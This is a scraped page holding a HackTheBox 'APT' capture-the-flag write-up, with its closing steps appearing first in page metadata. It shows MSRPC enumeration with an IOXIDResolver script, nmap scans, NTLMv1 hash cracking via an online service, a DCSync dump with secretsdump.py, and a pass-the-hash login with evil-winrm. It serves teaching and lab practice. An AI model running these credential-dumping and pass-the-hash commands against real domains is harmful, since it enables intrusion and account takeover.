Windows uses the current credentials.\nHowever, because Windows Defender is already running as SYSTEM (built-in local system), (afaik) it can not be downgraded to a lower privilege for authentication. It won’t authenticate using SYSTEM as well. Instead, it uses the machine/computer account for authentication. LocalSystem and NetworkService credentials use computer account for authentication.\nCracking NTLMv1 hash I can submit the hash to https://crack.sh/ with the following format.\nNTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384 It will automatically detect the input.\nNot even a minute passed, it sent me the result.\nThe key is d167c3238864b12f5f82feae86a7f798, it’s the NTLM hash/NThash that can be used for pass-the-hash attack.\nCredential Dumping NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using secretsdump.py. I’ll take only the administrator hash.\n→ root@iamf «~» «10.10.14.72» $ secretsdump.py 'htb.local/APT$@apt' -hashes 'd167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798' -just-dc-user administrator Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2::: ..... [*] Cleaning up... I can login into the box using evil-winrm with the administrator hash I obtained.\n→ root@iamf «~» «10.10.14.72» $ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2 Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents type ..\\Desktop\\root.txt a1f204c405aea36388...[SNIP]... *Evil-WinRM* PS C:\\Users\\Administrator\\Documents  References   https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc\n  https://pubs.opengroup.org/onlinepubs/098759899/CHP21CHP.HTM\n  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/f8bb99d3-7755-4ab9-9510-09920196f8b0\n  https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4\n  https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/\n  https://en.wikipedia.org/wiki/NT_LAN_Manager\n  https://www.blackhat.com/presentations/win-usa-04/bh-win-04-seki-up2.pdf\n  https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4\n  https://www.trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1/\n  https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/machine-account-password-process/ba-p/396026\n  ","wordCount":"3501","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773.png","datePublished":"2021-04-17T00:09:51+07:00","dateModified":"2021-04-17T00:09:51+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-apt/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
</noscript>
<header class="header sticky">
<nav class=nav>
<div class=menu-wrapper>
<div class=logo>
<a href=https://fahmifj.github.io/ accesskey=h title=友人F>友人F</a>
</span>
</div>
<ul id=menu onscroll=menu_on_scroll()>
<li>
<a href=https://fahmifj.github.io/about/ title=About>About</a>
</li>
<li>
<a href=https://fahmifj.github.io/archives/ title=Archives>Archives</a>
</li>
<li>
<a href=https://fahmifj.github.io/projects/ title=Projects>Projects</a>
</li>
<li>
<a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/>Search</a>
</li>
</ul>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
HackTheBox - APT
</h1>
<div class=post-description>
Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1
</div>
<div class=post-meta>
April 17, 2021&nbsp;·&nbsp;17 min&nbsp;·&nbsp;Fahmi FJ
</div>
</header>
<div class=post-content-wrapper><div class=toc>
<div class=inner><ul>
<li>
<a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul>
<li>
<a href=#nmap---ipv4 aria-label="Nmap - IPv4">Nmap - IPv4</a></li></ul>
</li>
<li>
<a href=#enumeration aria-label=Enumeration>Enumeration</a><ul>
<li>
<a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li>
<li>
<a href=#tcp-135---msrpc aria-label="TCP 135 - MSRPC">TCP 135 - MSRPC</a></li>
<li>
<a href=#nmap---ipv6 aria-label="Nmap - IPv6">Nmap - IPv6</a></li>
<li>
<a href=#tcp-445---smb-ipv6 aria-label="TCP 445 - SMB (IPv6)">TCP 445 - SMB (IPv6)</a></li>
<li>
<a href=#tcp-88---kerberos aria-label="TCP 88 - Kerberos">TCP 88 - Kerberos</a></li></ul>
</li>
<li>
<a href=#foothold aria-label=Foothold>Foothold</a><ul>
<li>
<a href=#shell-as-henryvinson_adm aria-label="Shell as henry.vinson_adm">Shell as henry.vinson_adm</a></li></ul>
</li>
<li>
<a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul>
<li>
<a href=#shell-as-administrator aria-label="Shell as administrator">Shell as administrator</a></li></ul>
</li>
<li>
<a href=#references aria-label=References>References</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content>
<figure class=entry-cover>
<img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773_hu4256bed329ec7a2f0d7b837ca436113d_141290_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773_hu4256bed329ec7a2f0d7b837ca436113d_141290_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773_hu4256bed329ec7a2f0d7b837ca436113d_141290_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773.png 743w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-apt/imgs/image-20210416215141773.png alt>
<p><text></p>
</figure><p>APT is an insane difficulty Windows machine from HackTheBox and it starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named <em>ServerAlive()</em> can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain all the users' hashes. Brute-force attack is performed to obtain one valid credentials from these hashes. With these credentials, I&rsquo;m able to send a query to the registry and obtain another set of credentials for remote access to the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.</p>
<h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4>
<ul>
<li>RPC enumeration</li>
<li>Port Forwarding</li>
<li>Remote Registry</li>
<li>Exploiting NTLMv1</li>
</ul>
<h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4>
<ul>
<li>Nmap</li>
<li>Gobuster - <a href=https://github.com/OJ/gobuster>https://github.com/OJ/gobuster</a></li>
<li>Impacket - <a href=https://github.com/SecureAuthCorp/impacket>https://github.com/SecureAuthCorp/impacket</a></li>
<li>IOXIDResolver - <a href=https://github.com/mubix/IOXIDResolver>https://github.com/mubix/IOXIDResolver</a></li>
<li>CrackMapExec - <a href=https://github.com/byt3bl33d3r/CrackMapExec>https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>Socat</li>
<li>Kerbrute - <a href=https://github.com/ropnop/kerbrute>https://github.com/ropnop/kerbrute</a></li>
<li>pyKerbrute - <a href=https://github.com/3gstudent/pyKerbrute>https://github.com/3gstudent/pyKerbrute</a></li>
<li>Responder - <a href=https://github.com/lgandx/Responder>https://github.com/lgandx/Responder</a></li>
</ul>
<h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2>
<h3 id=nmap---ipv4>Nmap - IPv4<a class=anchor aria-hidden=true href=#nmap---ipv4>#</a></h3>
<p>Both the initial scan and full scan with <code>nmap</code> shows two open ports: HTTP with IIS server on port 80, and MSRPC on port 135.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «apt» «10.10.14.72» 
$ nmap -sC -sV -oA nmap/initial-apt <span class=s1>&#39;10.10.10.213&#39;</span> -v

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
<span class=p>|</span> http-methods: 
<span class=p>|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
<span class=p>|</span>_  Potentially risky methods: TRACE
<span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
<span class=p>|</span>_http-title: Gigantic Hosting <span class=p>|</span> Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2>
<h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3>
<p>Visiting port 80 on the browser shows up a website called &ldquo;Gigantic Hosting&rdquo;.</p>
<p><img class=img-container src=imgs/image-20210415055156844.png alt=image-20210415055156844>
</p>
<p>The input vectors on <code>https://10.13.38.16/contact-post.html</code> don&rsquo;t appear to be neither vulnerable nor injectable.</p>
<p><img class=img-container src=imgs/image-20210415061845703.png alt=image-20210415061845703>
</p>
<p>It sends a post request with an empty body to a host that can not be resolved by my network.</p>
<p>Here is the example request.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>https://10.13.38.16/contact-post.html</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>10.13.38.16</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
<span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.10.213/support.html</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>0</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</code></pre></div><p>I did ran gobuster, but didn&rsquo;t find anything interesting.</p>
<h3 id=tcp-135---msrpc>TCP 135 - MSRPC<a class=anchor aria-hidden=true href=#tcp-135---msrpc>#</a></h3>
<p>Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of <a href=https://en.wikipedia.org/wiki/DCE/RPChttps://en.wikipedia.org/wiki/DCE/RPC>DCE/RPC</a>. MSRPC works together with the Distributed Component Object Model (DCOM), and DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport.</p>
<p>DCOM and RPC endpoint mapper sit on port 135 (both of them run on the shared process of <code>svchost.exe</code>). The RPC endpoint mapper maintains the <strong>database of endpoints</strong> that clients use to map an interface to endpoints, and there is a tool called <code>rpcdump.py</code> from Impacket that can be used to dump those endpoints:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «apt» «10.10.14.72»
$ rpcdump.py -port <span class=m>135</span> <span class=s1>&#39;10.10.10.213&#39;</span>

<span class=o>[</span>*<span class=o>]</span> Retrieving endpoint list from 10.10.10.213
...<span class=o>[</span>SNIP<span class=o>]</span>...
Protocol: <span class=o>[</span>MS-RSP<span class=o>]</span>: Remote Shutdown Protocol
Provider: wininit.exe
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
Bindings:
          ncacn_ip_tcp:10.10.10.213<span class=o>[</span>49664<span class=o>]</span>
          ncalrpc:<span class=o>[</span>WindowsShutdown<span class=o>]</span>
          ncacn_np:<span class=se>\\</span>APT<span class=o>[</span><span class=se>\P</span>IPE<span class=se>\I</span>nitShutdown<span class=o>]</span>
          ncalrpc:<span class=o>[</span>WMsgKRpc06C4F0<span class=o>]</span>
...<span class=o>[</span>SNIP<span class=o>]</span>...
<span class=o>[</span>*<span class=o>]</span> Received <span class=m>265</span> endpoints.
</code></pre></div><p><code>ncacn_http</code>, <code>ncacn_np</code>, <code>ncacn_ip_tcp</code> are known as protocol string/protocol sequence. It is the language (protocol) that a network operating system uses <em>to talk over</em> the network to other computers [<a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi8veDouNHwAhVbAXIKHYarCu4QFjAAegQIAhAD&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Frpc%2Fselecting-a-protocol-sequence&usg=AOvVaw14KDvhbl4W2VCPGweUBVzP">source</a>].</p>
<h4 id=scan-for-listening-rpc-interfaces>Scan for Listening RPC Interfaces<a class=anchor aria-hidden=true href=#scan-for-listening-rpc-interfaces>#</a></h4>
<p>I can use <code>rpcmap.py</code>, which also from Impacket, to get a list of currently listening RPC interfaces that are accessible over TCP/IP.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «apt» «10.10.14.72»
$ rpcmap.py <span class=s1>&#39;ncacn_ip_tcp:10.10.10.213[135]&#39;</span> -brute-uuid

...<span class=o>[</span>SNIP<span class=o>]</span>...
Protocol: <span class=o>[</span>MS-DCOM<span class=o>]</span>: Distributed Component Object Model <span class=o>(</span>DCOM<span class=o>)</span> Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Protocol: <span class=o>[</span>MS-DCOM<span class=o>]</span>: Distributed Component Object Model <span class=o>(</span>DCOM<span class=o>)</span> Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Protocol: <span class=o>[</span>MS-DCOM<span class=o>]</span>: Distributed Component Object Model <span class=o>(</span>DCOM<span class=o>)</span> Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
...<span class=o>[</span>SNIP<span class=o>]</span>...

<span class=o>[</span>*<span class=o>]</span> Tested <span class=m>354</span> UUID<span class=o>(</span>s<span class=o>)</span>
</code></pre></div><p>From the results above, three of them are the interfaces provided by DCOM, details of those interfaces are documented by Microsoft in <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4>well-known UUIDs</a>.</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>GUID</th>
<th>Purpose</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td>IID_IRemoteSCMActivator</td>
<td>{000001A0-0000-0000-C000-000000000046}</td>
<td>RPC interface UUID for IRemoteSCMActivator</td>
<td>RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.</td>
</tr>
<tr>
<td>IID_IActivation</td>
<td>{4d9f4ab8-7d1c-11cf-861e-0020af6e7c57}</td>
<td>RPC interface UUID for IActivation</td>
<td>IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol</td>
</tr>
<tr>
<td>IID_IObjectExporter</td>
<td>{99fcfec4-5260-101b-bbcb-00aa0021347a}</td>
<td>RPC interface UUID for IObjectExporter</td>
<td>IObjectExporter is the interface used for OXID resolution, pinging, and <strong>server aliveness</strong> tests. All object resolvers MUST support the IObjectExporter interface</td>
</tr>
</tbody>
</table>
<h4 id=network-interfaces-enumeration>Network Interfaces Enumeration<a class=anchor aria-hidden=true href=#network-interfaces-enumeration>#</a></h4>
<p>According to this <a href=https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/>post</a>, written by Nicolas Delhaye, the <code>ServerAlive2()</code> method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve a list of network interfaces of a remote computer. Nicolas also provides the PoC for this.</p>
<p><img class=img-container src=imgs/image-20210415065746943.png alt=image-20210415065746943 title="List of available methods in IObjectExport interface. ">
</p>
<blockquote>
<p>Opnum is operation number to identify a specific rpc method or a method in an interface.</p>
</blockquote>
<p>I can use <code>rpcmap.py</code> with <code>-brute-opnums</code> option to determine which interface&rsquo;s methods are accessible, and the IObjectExport interface shows that Opnum 3 and Opnum 5 are accessible, this means access to ServerAlive() is allowed.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «rpc-enum» «10.10.14.72»
$ rpcmap.py -brute-opnums -opnum-max <span class=m>5</span> <span class=s1>&#39;ncacn_ip_tcp:10.10.10.213&#39;</span>

...<span class=o>[</span>SNIP<span class=o>]</span>...
Protocol: <span class=o>[</span>MS-DCOM<span class=o>]</span>: Distributed Component Object Model <span class=o>(</span>DCOM<span class=o>)</span> Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
Opnum 0: rpc_x_bad_stub_data
Opnum 1: rpc_x_bad_stub_data
Opnum 2: rpc_x_bad_stub_data
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: success
</code></pre></div><p>From here, I can use the provided PoC script.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/python</span>

<span class=kn>import</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>getopt</span>

<span class=kn>from</span> <span class=nn>impacket.dcerpc.v5</span> <span class=kn>import</span> <span class=n>transport</span>
<span class=kn>from</span> <span class=nn>impacket.dcerpc.v5.rpcrt</span> <span class=kn>import</span> <span class=n>RPC_C_AUTHN_LEVEL_NONE</span>
<span class=kn>from</span> <span class=nn>impacket.dcerpc.v5.dcomrt</span> <span class=kn>import</span> <span class=n>IObjectExporter</span>

<span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>argv</span><span class=p>):</span>

    <span class=k>try</span><span class=p>:</span>
        <span class=n>opts</span><span class=p>,</span> <span class=n>args</span> <span class=o>=</span> <span class=n>getopt</span><span class=o>.</span><span class=n>getopt</span><span class=p>(</span><span class=n>argv</span><span class=p>,</span><span class=s2>&#34;ht:&#34;</span><span class=p>,[</span><span class=s2>&#34;target=&#34;</span><span class=p>])</span>
    <span class=k>except</span> <span class=n>getopt</span><span class=o>.</span><span class=n>GetoptError</span><span class=p>:</span>
        <span class=nb>print</span> <span class=s1>&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span>
        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>

    <span class=n>target_ip</span> <span class=o>=</span> <span class=s2>&#34;192.168.1.1&#34;</span>

    <span class=k>for</span> <span class=n>opt</span><span class=p>,</span> <span class=n>arg</span> <span class=ow>in</span> <span class=n>opts</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>opt</span> <span class=o>==</span> <span class=s1>&#39;-h&#39;</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span><span class=p>)</span>
            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>()</span>
        <span class=k>elif</span> <span class=n>opt</span> <span class=ow>in</span> <span class=p>(</span><span class=s2>&#34;-t&#34;</span><span class=p>,</span> <span class=s2>&#34;--target&#34;</span><span class=p>):</span>
            <span class=n>target_ip</span> <span class=o>=</span> <span class=n>arg</span>

    <span class=n>authLevel</span> <span class=o>=</span> <span class=n>RPC_C_AUTHN_LEVEL_NONE</span>

    <span class=n>stringBinding</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;ncacn_ip_tcp:</span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>target_ip</span>
    <span class=n>rpctransport</span> <span class=o>=</span> <span class=n>transport</span><span class=o>.</span><span class=n>DCERPCTransportFactory</span><span class=p>(</span><span class=n>stringBinding</span><span class=p>)</span>

    <span class=n>portmap</span> <span class=o>=</span> <span class=n>rpctransport</span><span class=o>.</span><span class=n>get_dce_rpc</span><span class=p>()</span>
    <span class=n>portmap</span><span class=o>.</span><span class=n>set_auth_level</span><span class=p>(</span><span class=n>authLevel</span><span class=p>)</span>
    <span class=n>portmap</span><span class=o>.</span><span class=n>connect</span><span class=p>()</span>

    <span class=n>objExporter</span> <span class=o>=</span> <span class=n>IObjectExporter</span><span class=p>(</span><span class=n>portmap</span><span class=p>)</span>
    <span class=n>bindings</span> <span class=o>=</span> <span class=n>objExporter</span><span class=o>.</span><span class=n>ServerAlive2</span><span class=p>()</span>

    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Retrieving network interface of &#34;</span> <span class=o>+</span> <span class=n>target_ip</span><span class=p>)</span>

    <span class=k>for</span> <span class=n>binding</span> <span class=ow>in</span> <span class=n>bindings</span><span class=p>:</span>
        <span class=n>NetworkAddr</span> <span class=o>=</span> <span class=n>binding</span><span class=p>[</span><span class=s1>&#39;aNetworkAddr&#39;</span><span class=p>]</span>
        <span class=nb>print</span> <span class=s2>&#34;Address: &#34;</span> <span class=o>+</span> <span class=n>NetworkAddr</span>

<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
   <span class=n>main</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:])</span>
</code></pre></div><p>The script returns with two IPv6 addresses of the machine.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «rpc-enum» «10.10.14.72» 
$ ./IOXIDResolver.py -t <span class=s1>&#39;10.10.10.213&#39;</span>
<span class=o>[</span>*<span class=o>]</span> Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::89df:c1d4:6aaf:67ce
</code></pre></div><p>I will add these addresses to my <code>/etc/hosts</code> file.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «rpc-enum» «10.10.14.72» 
$ <span class=nb>echo</span> <span class=s1>&#39;dead:beef::b885:d62a:d679:573f apt&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h3 id=nmap---ipv6>Nmap - IPv6<a class=anchor aria-hidden=true href=#nmap---ipv6>#</a></h3>
<p>I will run another nmap scan against the machine on the IPv6 address.</p>
<blockquote>
<p>For me, scanning these two addresses returns the same results.</p>
</blockquote>
<p>This time, <code>nmap</code> shows the common ports of Active Directory domain controller.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «apt» «10.10.14.72» 
$ nmap -6 --min-rate <span class=m>1000</span> -sC -sV -oA nmap/initial-apt-ipv6 <span class=s1>&#39;dead:beef::b885:d62a:d679:573f&#39;</span> -v
...<span class=o>[</span>SNIP<span class=o>]</span>...
PORT    STATE SERVICE      VERSION
53/tcp  open  domain?
<span class=p>|</span> fingerprint-strings: 
<span class=p>|</span>   DNSVersionBindReqTCP: 
<span class=p>|</span>     version
<span class=p>|</span>_    <span class=nb>bind</span>
80/tcp  open  http         Microsoft IIS httpd 10.0
<span class=p>|</span> http-methods: 
<span class=p>|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
<span class=p>|</span>_  Potentially risky methods: TRACE
<span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
<span class=p>|</span>_http-title: Gigantic Hosting <span class=p>|</span> Home
88/tcp  open  kerberos-sec Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-04-15 00:36:03Z<span class=o>)</span>
135/tcp open  msrpc        Microsoft Windows RPC
389/tcp open  ldap         Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: htb.local, Site: Default-First-Site-Name<span class=o>)</span>
<span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>apt.htb.local
<span class=p>|</span> Subject Alternative Name: DNS:apt.htb.local
<span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>apt.htb.local
<span class=p>|</span> Public Key type: rsa
<span class=p>|</span> Public Key bits: <span class=m>2048</span>
<span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
<span class=p>|</span> Not valid before: 2020-09-24T07:07:18
<span class=p>|</span> Not valid after:  2050-09-24T07:17:18
<span class=p>|</span> MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
<span class=p>|</span>_SHA-1: f677 c290 98c0 2ac5 <span class=m>8575</span> <span class=m>7060</span> 683d cdbc 5f86 5d45
<span class=p>|</span>_ssl-date: 2021-04-15T00:38:57+00:00<span class=p>;</span> -1s from scanner time.
445/tcp open  microsoft-ds Windows Server <span class=m>2016</span> Standard <span class=m>14393</span> microsoft-ds <span class=o>(</span>workgroup: HTB<span class=o>)</span>
464/tcp open  kpasswd5?
593/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: htb.local, Site: Default-First-Site-Name<span class=o>)</span>
<span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>apt.htb.local
<span class=p>|</span> Subject Alternative Name: DNS:apt.htb.local
<span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>apt.htb.local
<span class=p>|</span> Public Key type: rsa
<span class=p>|</span> Public Key bits: <span class=m>2048</span>
<span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
<span class=p>|</span> Not valid before: 2020-09-24T07:07:18
<span class=p>|</span> Not valid after:  2050-09-24T07:17:18
<span class=p>|</span> MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
<span class=p>|</span>_SHA-1: f677 c290 98c0 2ac5 <span class=m>8575</span> <span class=m>7060</span> 683d cdbc 5f86 5d45
<span class=p>|</span>_ssl-date: 2021-04-15T00:38:57+00:00<span class=p>;</span> -1s from scanner time.
<span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>4/14%Time<span class=o>=</span>60778A78%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>DNSV
SF:ersionBindReqTCP,20,<span class=s2>&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span><span class=s2>SF:x04bind\0\0\x10\0\x03&#34;</span><span class=o>)</span><span class=p>;</span>
Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class=p>|</span>_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s
<span class=p>|</span> smb-os-discovery: 
<span class=p>|</span>   OS: Windows Server <span class=m>2016</span> Standard <span class=m>14393</span> <span class=o>(</span>Windows Server <span class=m>2016</span> Standard 6.3<span class=o>)</span>
<span class=p>|</span>   Computer name: apt
<span class=p>|</span>   NetBIOS computer name: APT<span class=se>\x</span><span class=m>00</span>
<span class=p>|</span>   Domain name: htb.local
<span class=p>|</span>   Forest name: htb.local
<span class=p>|</span>   FQDN: apt.htb.local
<span class=p>|</span>_  System time: 2021-04-15T01:38:41+01:00
<span class=p>|</span> smb-security-mode: 
<span class=p>|</span>   account_used: &lt;blank&gt;
<span class=p>|</span>   authentication_level: user
<span class=p>|</span>   challenge_response: supported
<span class=p>|</span>_  message_signing: required
<span class=p>|</span> smb2-security-mode: 
<span class=p>|</span>   2.02: 
<span class=p>|</span>_    Message signing enabled and required
<span class=p>|</span> smb2-time: 
<span class=p>|</span>   date: 2021-04-15T00:38:39
<span class=p>|</span>_  start_date: 2021-04-14T16:50:06
</code></pre></div><p>I will take notes on:</p>
<ul>
<li>
<p>Domain name: <code>htb.local</code></p>
</li>
<li>
<p>FQDN: <code>apt.htb.local</code></p>
</li>
<li>
<p>Host: Windows Server 2016 Standard 14393</p>
</li>
</ul>
<p>On a full port scan, there is a WinRM listening on IPv6.</p>
